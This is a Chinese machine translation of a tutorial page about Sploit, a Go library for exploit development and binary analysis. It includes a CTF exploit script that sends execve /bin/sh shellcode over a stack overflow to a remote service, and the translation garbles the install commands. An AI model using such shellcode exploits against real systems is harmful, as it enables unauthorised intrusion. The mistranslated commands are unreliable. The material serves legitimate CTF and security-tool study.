# Sploit : Go 包有助于二进制分析和开发

> 原文：<https://kalilinuxtutorials.com/sploit/>

[![Sploit : Go Package That Aids In Binary Analysis And Exploitation](img/7881ae522d9b4b1458ae8f97a46cc623.png "Sploit : Go Package That Aids In Binary Analysis And Exploitation")](https://1.bp.blogspot.com/-eYg86H6H0sM/X-PEXafulXI/AAAAAAAAINM/fvAWG5ryQSMszJkHQ9H1mnsdtaoQQXxogCLcBGAsYHQ/s728/Sploit%25281%2529.png)

Sploit 是一个 Go 包，有助于二进制分析和开发。sploit 开发背后的推动因素是能够拥有一个设计良好的 API，其功能可以与一些更常见的 Python 开发框架相媲美，同时利用 Go 编程语言。出色的交叉编译器支持、goroutines、强大的加密库和静态类型只是选择 Go 的几个原因。

这个项目的灵感来自 pwntools 和其他一些很棒的项目。它仍处于早期发展阶段。预计该项目将重点关注外壳编码、二进制补丁、ROP 堆栈构建和一般二进制分析。

**CTF 挑战赛的解决方案**

```
package main;

import(
    sp "github.com/zznop/sploit"
)

var arch = &sp.Processor {
    Architecture: sp.ArchI386,
    Endian: sp.LittleEndian,
}

var scInstrs = `mov al, 0xb   /* __NR_execve */
                sub esp, 0x30 /* Get pointer to /bin/sh (see below) */
                mov ebx, esp  /* filename (/bin/sh) */
                xor ecx, ecx  /* argv (NULL) */
                xor edx, edx  /* envp (NULL) */
                int 0x80`

func main() {
    shellcode, _ := sp.Asm(arch, scInstrs)
    r, _ := sp.NewRemote("tcp", "some.pwnable.on.the.interwebz:10800")
    defer r.Close()
    r.RecvUntil([]byte("HELLO:"), true)

    // Leak a stack address
    r.Send(append([]byte("/bin/sh\x00AAAAAAAAAAAA"), sp.PackUint32LE(0x08048087)...))
    resp, _ := r.RecvN(20)
    leakAddr := sp.UnpackUint32LE(resp[0:4])

    // Pop a shell
    junk := make([]byte, 20-len(shellcode))
    junk = append(junk, sp.PackUint32LE(leakAddr-4)...)
    r.Send(append(shellcode, junk...))
    r.Interactive()
}
```

**将汇编编译成机器码**

```
package main;

import(
    "github.com/zznop/sploit"
    "encoding/hex"
    "fmt"
)

func main() {
    instrs := "mov rcx, r12\n"              +
              "mov rdx, r13\n"              +
              "mov r8, 0x1f\n"              +
              "xor r9, r9\n"                +
              "sub rsp, 0x8\n"              +
              "mov qword [rsp+0x20], rax\n"

    arch := &sploit.Processor {
        Architecture: sploit.ArchX8664,
        Endian: sploit.LittleEndian,
    }

    opcode, _ := sploit.Asm(arch, instrs)
    fmt.Printf("Opcode bytes:\n%s\n", hex.Dump(opcode))
}
```

```
$ ./assemble_example
Opcode bytes:
00000000  4c 89 e1 4c 89 ea 49 c7  c0 1f 00 00 00 4d 31 c9  |L..L..I......M1.|
00000010  48 83 ec 08 48 89 44 24  28                       |H...H.D$(| 
```

**在 ELF 可执行文件中反汇编代码**

```
package main;

import(
    "github.com/zznop/sploit"
    "fmt"
)

var program = "../test/prog1.x86_64"

func main() {
    elf, _ := sploit.NewELF(program)
    vaddr := uint64(0x1135)
    count := 34
    fmt.Printf("Disassembling %v bytes at vaddr:%08x\n", count, vaddr)
    disasm, _ := elf.Disasm(vaddr, count)
    fmt.Print(disasm)
}
```

```
$ ./disassemble_example
Disassembling 34 bytes at vaddr:00001135
00001135: push rbp
00001136: mov rbp, rsp
00001139: sub rsp, 0x10
0000113d: mov dword ptr [rbp - 4], edi
00001140: mov qword ptr [rbp - 0x10], rsi
00001144: lea rdi, [rip + 0xeb9]
0000114b: call 0x1030
00001150: mov eax, 0
00001155: leave
00001156: ret 
```

**查询和过滤 ROP 小工具**

```
package main;

import(
    "github.com/zznop/sploit"
)

var program = "../test/prog1.x86_64"

func main() {
    elf, _ := sploit.NewELF(program)
    rop, _ := elf.ROP()

    matched, _ := rop.InstrSearch("pop rbp")
    matched.Dump()
}
```

```
0000111f: pop rbp ; ret
0000111d: add byte ptr [rcx], al ; pop rbp ; ret
00001118: mov byte ptr [rip + 0x2f11], 1 ; pop rbp ; ret
00001113: call 0x1080 ; mov byte ptr [rip + 0x2f11], 1 ; pop rbp ; ret
000011b7: pop rbp ; pop r14 ; pop r15 ; ret
000011b3: pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
000011b2: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
000011af: add esp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
000011ae: add rsp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
... 
```

**依赖关系**

Sploit 的一些功能依赖于外部依赖。例如，Sploit 使用 GCC 的 GAS assembler 来编译汇编代码，使用 capstone 来反汇编编译后的代码，作为由`asm.go`公开的 API 的一部分。

**安装顶石:**

**git 克隆 https://github.com/aquynh/capstone.git–分支 4 . 0 . 2–单分支
cd 顶石
制作
sudo 制作安装**

安装 GCC 交叉编译器。以下命令假设您在 Intel 工作站上运行 Debian 或 Ubuntu，如果运行另一个 Linux 发行版，可能需要更改:

**sudo 安装 gcc gcc-arm-Linux-gnueabi gcc-aarch 64-Linux-GNU gcc-MIPS-Linux-GNU \ gcc-mipsel-Linux-GNU gcc-powerpc-Linux-GNU**

[**Download**](https://github.com/zznop/sploit)